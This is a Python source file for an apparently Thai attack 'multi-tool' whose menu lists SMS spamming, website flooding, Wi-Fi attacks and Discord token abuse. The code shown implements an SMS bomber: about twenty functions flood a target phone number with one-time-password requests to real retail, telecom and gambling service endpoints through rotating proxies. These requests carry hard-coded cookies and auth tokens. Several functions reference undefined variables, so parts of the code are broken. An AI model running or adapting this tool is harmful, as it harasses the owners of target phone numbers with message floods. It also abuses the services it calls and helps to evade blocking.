# รวมโปรแกรม - By Highzy 
# Discord - https://discord.com/invite/zdNjNPmfFF
import requests, time, random
import time
from multiprocessing.pool import ThreadPool
from requests import post,delete
from re import search
from colorama import Fore
from os import system
import datetime
from time import sleep
import cfscraper
import os
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import urllib.parse,sys,socket,threading,random,time,requests
import time
import threading
import sys 
import urllib.request
import pystyle
import colorama
import threading
from user_agent import generate_user_agent
from httpx import Client
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor
from requests import post, Session
import json
import random
import threading
from httpx import patch
from time import sleep
from colorama import Fore
import discum

def check_system():
	if (sys.platform == "linux"):
		print("Welcome!!!")
		os.system("clear")
	else:
		print("[!] Operating systems other than linux are not supported. ")
		os._exit(0)
		
check_system()


threads = 0
global email_queue
global data_email
global email_status
email_queue = "0"
email_status = None
data_email = None
l = Fore.LIGHTRED_EX
r = Fore.RED
y = Fore.YELLOW
g = Fore.GREEN
cy = Fore.CYAN
b = Fore.BLUE
w = Fore.WHITE


banner = F"""{Fore.CYAN}
                                                                                             
            ▄▄                                                                                          
▀███▀▀▀██▄▀███                ▀███          ▀████▄     ▄███▀               ▀███                ██       
  ██    ██  ██                  ██            ████    ████                   ██                ██       
  ██    ██  ██  ▄█▀██▄  ▄██▀██  ██  ▄██▀      █ ██   ▄█ ██  ▄█▀██▄ ▀███▄███  ██  ▄██▀  ▄▄█▀████████     
  ██▀▀▀█▄▄  ██ ██   ██ ██▀  ██  ██ ▄█         █  ██  █▀ ██ ██   ██   ██▀ ▀▀  ██ ▄█    ▄█▀   ██ ██       
  ██    ▀█  ██  ▄█████ ██       ██▄██         █  ██▄█▀  ██  ▄█████   ██      ██▄██    ██▀▀▀▀▀▀ ██       
  ██    ▄█  ██ ██   ██ ██▄    ▄ ██ ▀██▄       █  ▀██▀   ██ ██   ██   ██      ██ ▀██▄  ██▄    ▄ ██       
▄████████ ▄████▄████▀██▄█████▀▄████▄ ██▄▄   ▄███▄ ▀▀  ▄████▄████▀██▄████▄  ▄████▄ ██▄▄ ▀█████▀ ▀████    
                                                                                                        
                                          (ป้อนตัวพิมพ์ใหญ่หรือตัวพิมพ์เล็ก)                                                              
                                           วิธีใช้งาน 
                                            S = สแปมข้อความ
                                            N = สแปมข้อความไอจี-เอ็นจีแอล (Ngl)
                                            W = สแปมเว็ปฮุ้ก-ลบเว็ปฮุ้ก
                                            Z = ยิงเว็ปไซต์
                                            T = สแปมโดยใช้โทเค่น
                                            D = ดูดคริป-วิดีโอในดิสคอร์ด
                                            J = ยิงวายฟาย-ยิงเน็ต
                                            K = พังโทเค่นดิสคอร์ด
"""
rainbowbanner = F"""{Fore.LIGHTRED_EX}
            ▄▄                                                                                          
▀███▀▀▀██▄▀███                ▀███          ▀████▄     ▄███▀               ▀███                ██       
  ██    ██  ██                  ██            ████    ████                   ██                ██       
  ██    ██  ██  ▄█▀██▄  ▄██▀██  ██  ▄██▀      █ ██   ▄█ ██  ▄█▀██▄ ▀███▄███  ██  ▄██▀  ▄▄█▀████████     
  ██▀▀▀█▄▄  ██ ██   ██ ██▀  ██  ██ ▄█         █  ██  █▀ ██ ██   ██   ██▀ ▀▀  ██ ▄█    ▄█▀   ██ ██       
  ██    ▀█  ██  ▄█████ ██       ██▄██         █  ██▄█▀  ██  ▄█████   ██      ██▄██    ██▀▀▀▀▀▀ ██       
  ██    ▄█  ██ ██   ██ ██▄    ▄ ██ ▀██▄       █  ▀██▀   ██ ██   ██   ██      ██ ▀██▄  ██▄    ▄ ██       
▄████████ ▄████▄████▀██▄█████▀▄████▄ ██▄▄   ▄███▄ ▀▀  ▄████▄████▀██▄████▄  ▄████▄ ██▄▄ ▀█████▀ ▀████    
                                                                                                        
                                                                                                        
                                                                                                        """
                                                                                                        
bannersucceed = F"""
                            Spam Succeeded!
                            """
                            
bannerbmk = F"""{Fore.BLUE}
            ▄▄                                                                                          
▀███▀▀▀██▄▀███                ▀███          ▀████▄     ▄███▀               ▀███                ██       
  ██    ██  ██                  ██            ████    ████                   ██                ██       
  ██    ██  ██  ▄█▀██▄  ▄██▀██  ██  ▄██▀      █ ██   ▄█ ██  ▄█▀██▄ ▀███▄███  ██  ▄██▀  ▄▄█▀████████     
  ██▀▀▀█▄▄  ██ ██   ██ ██▀  ██  ██ ▄█         █  ██  █▀ ██ ██   ██   ██▀ ▀▀  ██ ▄█    ▄█▀   ██ ██       
  ██    ▀█  ██  ▄█████ ██       ██▄██         █  ██▄█▀  ██  ▄█████   ██      ██▄██    ██▀▀▀▀▀▀ ██       
  ██    ▄█  ██ ██   ██ ██▄    ▄ ██ ▀██▄       █  ▀██▀   ██ ██   ██   ██      ██ ▀██▄  ██▄    ▄ ██       
▄████████ ▄████▄████▀██▄█████▀▄████▄ ██▄▄   ▄███▄ ▀▀  ▄████▄████▀██▄████▄  ▄████▄ ██▄▄ ▀█████▀ ▀████    
                                                                                                        
"""                                                                                                        
                                                                                                                                                                
def spamsmS():
    os.system("clear")
    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
    header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
    proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
    f = open("proxy.txt", "w")
    t = f.write(proxy)
    g = open("proxy.txt", "r")
    s = g.read().splitlines()
    
    def api1(target):
        global threads
        try:
            response2 = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
            if sms.status_code == 200 or sms.status_code == 201:
                print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
            else:
               print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {sms.status_code}"
		      )
        except:
            pass
		
    def api2(target):
        global threads
        try:
            requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
          pass
		
    def api3(target):
        global threads
        try:
            headers = {"accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
            requests.post("https://api.ypkshop.com/TOH5jkk3N031INbUepb-2SZCYIj5XGQr_xd-aSSd74s~",headers=headers,data=f"prefix=66&mobile={target}&type=1",proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass            
		
    def api4(target):
        global threads
        headers = {
		"Host": "shopgenix.com",
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": "okhttp/3.14.9"
	}
        try:
         requests.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={target}",proxies={'http': 'http://' + random.choice(s)})
         threads += 1
         print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass     
		
    def api5(target):
        global threads
        try:
            response = requests.post("https://api.starzth.com/v2/token",headers={"Authorization": "Basic c2hvcDE3ODFBUEk6TVlWQmtkI2cyJmEyWSMzQGM="})
            token = response.json()['token']
            headers = {
			"authorization": "Bearer " + token,
			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
            }
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass     
		
    def api6(target):
        global threads
        try:
            requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{target}"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api7(target):
        global threads
        try:
            requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{target}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api8(target):
        global threads
        try:
            requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={target}",headers={
	    "Accept": "application/json, text/plain, /",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
	    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api9(target):
        global threads
        try:
            requests.post("https://www.konvy.com/ajax/system.php?action=get_phone_code",data=f"type=reg&phone={target}&platform=1",headers={"accept": "application/json, text/plain, text/html, text/xml, text/javascript ,image/webp, */*","content-type": "application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","cookie": "f34c_lang2=th_TH;_gcl_au=1.1.772736218.1693663780;_tt_enable_cookie=1;_ttp=dNuShIuyOWBlc6c6_g0VW_C-1ma;k_privacy_state=true;_fbp=fb.1.1693663782140.1359249614;_gid=GA1.2.496014264.1694796867;_gat_UA-28072727-2=1;PHPSESSID=rjuo4ifo49s0d04ekrk5h6bd28;_ga=GA1.1.1256061802.1693663783;_ga_Z9S47GV47R=GS1.1.1694796867.2.1.1694796880.47.0.0;cto_bundle=03x9gV9aSGdNUVFwNUd4Y0RkUzNKZkl2aiUyQlRHNDlzbURwMVdXNDlxc1dMUHM0UXk0c0hId3dFMXhodXAySTV0TjJDSEFQSU9FUmo3Zm1idHYxZldLV3ZQTUdpMThmeUtGbGROJTJGRUxmTGJpZm00ZloyVzFEdFFFeFZCZUVrdWZlT1pEUUhYck9pRUpseGMlMkJVejdON3JVaHoyRlElM0QlM0Q"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api10(target):
        global threads
        headers = {
		"content-type": "application/json; charset=utf-8",
		"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..L4_HNTppIThHoII_MTndvA.7f_dO0lW5BKDf0AOw9QyinAURihBdvue6G0Xkb18_UXwbM_FxAtk4gknM8kQwSX7Rhfg188UFI73nB8CNu-YPgP-il9Q-4W53yuXC3HQPnBIvGkkFAhZ2JuE8piw0fkGaOGGRvOkhpHNEdaE6jYbRg.IkvgAosR8q6-gZIQANsaqA",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
		"cookie": "_vwo_uuid_v2=DEED3E33BAB6E6FD264940A38AE9770A3|f4d3bf084f98482cfae4d65b7fba48d7;_gcl_au=1.1.102477073.1693664216;__rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22XzVm9LWMCkhD9kjex4AI%22%7D;__lt__cid=ddc5d79b-b37c-47dd-b6e1-f19aedffcd71;__lt__sid=4a20fa5e-1bc444d4;_gid=GA1.2.387552209.1693664218;_gat_UA-12345-6=1;_hjSessionUser_1027858=eyJpZCI6IjJmYTEwNTdkLWExNjYtNWQzMS05OWE3LTczZjU5MTM0NjRkZSIsImNyZWF0ZWQiOjE2OTM2NjQyMTkyODQsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample_1027858=0;_hjSession_1027858=eyJpZCI6IjY4NTZiMTIxLWM5NzAtNDEyZS1iNWVmLTM1ODhhMGNmNmFjZCIsImNyZWF0ZWQiOjE2OTM2NjQyMTkzMDUsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;_fbp=fb.1.1693664219891.541560784;_tt_enable_cookie=1;_ttp=iIHPi-I_pJMyjSs4jgyO6N1YFcJ;_ga=GA1.2.1790770154.1693664218;cto_bundle=GcneO19nQnBDU1lxRzRzZ05BUFQ3bndkU3VDb2MxcHZkaiUyQnMlMkZzdzQzSEgxd0R3a3Y5aVIyOXBsTVg4S0poSmt3YiUyRkV3aTF3Z3NuVFYyREt2WDF5bUlMdjl2TG9rQlNlejdBUEIyZTRBTiUyRm9QcktTT3lyM3ElMkY3VENUcUxUYjVHRjVQVnBXZWE2bmF2eHQlMkI5YUxNNjJ0WWpRc1ElM0QlM0Q;_ga_QEVF0JHYKM=GS1.1.1693664218.1.1.1693664222.56.0.0;ajs_anonymous_id=4314c63d-9cc9-4477-a8e9-77bcb52a8800"
	}
        try:
            requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{target[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{target[1:]}&phoneCountryCode=%2B66&b-uid=1.0.835",proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api11(target):
        global threads
        try:
            requests.post("https://login.s-momclub.com/accounts.otp.sendCode",data=f"phoneNumber=%2B66{target[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Fregister%3Frefcode%3D202308-SEM-Web-CON_Sitelink%26utm_source%3Dgoogle%26utm_medium%3Dcpa%26utm_campaign%3Dweb-con_sitelink%26gclid%3DCj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB&sdkBuild=15170&format=json",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type" :"application/x-www-form-urlencoded","cookie": "_gcl_au=1.1.1632048683.1693716117;_gid=GA1.2.340423765.1693716117;_fbp=fb.1.1693716117240.325276938;_tt_enable_cookie=1;_ttp=se6fwL-mYqvtITeaMxUztaCZIU_;gmid=gmid.ver4.AcbHIDVFLA.Tn8z5RwuG5o_CNr7jK6qpVxncdn8zkkU7z55uuDdWjUFfGytJe6v2dDbny3V-zOa.jQN8PgyFAldrI1mtG3ZPz3w4iwhOd5D8GHvb6Ohw-LtWWiJ1HWpCWK9-e1oTFfv5TuY8xZPxPcOyPsItrp69Rg.sc3;ucid=9tUxT7gIPCn-5LdLHwrSfw;hasGmid=ver4;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;tfpsi=fc14307e-ab83-49f4-882b-be3243eed87b;_cls_v=e77d3523-cfd8-42dd-9c01-6628062d4acf;_cls_s=f00695fd-aeb5-4b40-8bed-e4594d3d0f4f:0;_gat_UA-62402337-1=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gcl_aw=GCL.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-62774158-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-27534376-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga=GA1.2.1260858029.1693716117;_gac_UA-62402337-1=1.1693716234.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga_HLYQD0DQEL=GS1.1.1693716117.1.1.1693716233.34.0.0",},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api12(target):
        global threads
        try:
            requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",json={"mobile_phone_no": target},headers={"Content-Type": "application/json"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass       
		
    def api13(target):
        global threads
        try:
            ip = requests.get("https://ipinfo.io/json").json()['ip']
            requests.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":target,"ip": ip},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api14(target):
        global threads
        try:
            requests.post("https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={target}",proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass	
		
    def api15(target):
        global threads
        try:
            requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass    
            
    def api16(target):
        global threads
        try:
            requests.post(f"https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass        
        
    def api17(target):
        global threads
        try:
            requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},json={"phonenumber": target,"language": "th"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass    
        
    def api18(target):
        global threads
        try:
            requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},json={"phonenumber": target,"language": "th"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass    
        
    def api19(target):
        global threads
        try:
            requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},json={"phonenumber": target,"language": "th"},proxies={'http': 'http://' + random.choice(s)})
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass    
        
    def api20(target):
        global threads
        try:
            requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"},proxies={'http': 'http://' + random.choice(s)}))
            threads += 1
            print(f"   \x1b[35m[\x1b[34mSTATUS-BLACKMARKET!\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
        except:
            pass          
        
    os.system("clear")
    print(bannerbmk)
    time.sleep(0.8)
    os.system("clear||cls")
    print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมสแปมข้อความ!!!"))
    time.sleep(1.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
    time.sleep(0.5)
    os.system("clear")
    print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
    time.sleep(1)
    os.system("clear")
    print(rainbowbanner)
